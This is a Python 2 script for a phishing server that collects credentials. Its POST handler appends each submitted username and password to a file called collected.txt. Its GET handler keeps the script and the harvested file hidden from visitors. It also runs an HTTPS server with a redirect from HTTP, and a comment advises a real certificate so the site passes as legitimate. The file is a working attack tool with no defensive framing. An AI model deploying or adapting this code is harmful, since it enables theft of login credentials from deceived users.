#!/usr/bin/python

import BaseHTTPServer, SimpleHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import urlparse
import ssl
import thread

# create a special server
class Server(SimpleHTTPServer.SimpleHTTPRequestHandler):

    # don't allow people to get to the server
    def do_GET(self):

        # insert disallowed URLs with these if statements, by changing the self.path to /index.html you force the incoming request to serve that page instead
        # TODO: allow a list of disallowed paths and allow regex.
        if self.path == '/':
          self.path = '/index.html'

        if self.path == "/server.py" or self.path == "/success.html":
          self.path = "/index.html"

        if self.path == "/collected.txt":
          self.path = "/index.html"

        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    # place collected passwords into a file (appended -- could get weird with lots of simultaneous requests,by the way.)
    # todo: handle multiple writes to the password file with a mutex.
    def do_POST(self):
        print "Password collected."
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        post_params = urlparse.parse_qs(post_body)

        # append collected credentials to collected.txt
        # note that this expects the username parameter to be "username" and the password parameter to be "password" -- this is rarely the case.
        # todo: make this configurable
        open("collected.txt","a").write(post_params['username'][0] + " ::: " + post_params['password'][0] + "\n")

        # handle post requests for unwanted paths
        if self.path == "/collected.txt":
            self.path = "/index.html"

        if self.path == "/server.py":
            self.path = "/index.html"

        # return a result to the user at the end of the handler
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

# server which produces a redirect to the encrypted version (gotta be secure)
class Redirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)

        # Provide a redirect to https version of the site (requires you to have a URL though - fill this out)
        # Todo: allow user to set this via a configuration file.
        self.send_header('Location','')
        self.end_headers()

# start the SSL server -- be sure to use your letsencrypt certificate so you're confused as a legit site.
httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), Server)

# YOU MUST INCLUDE YOUR OWN CERT AND KEY - you can't use mine.
# todo: make a config for this stuff
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='', keyfile='', server_side=True)
thread.start_new_thread(httpd.serve_forever,())

# start the HTTP server to provide the redirect -- this doesn't need to be threaded unless you need to do something after starting this server (serve_forever() doesn't return)
httpd2 = BaseHTTPServer.HTTPServer(('0.0.0.0',80),Redirect)
httpd2.serve_forever()
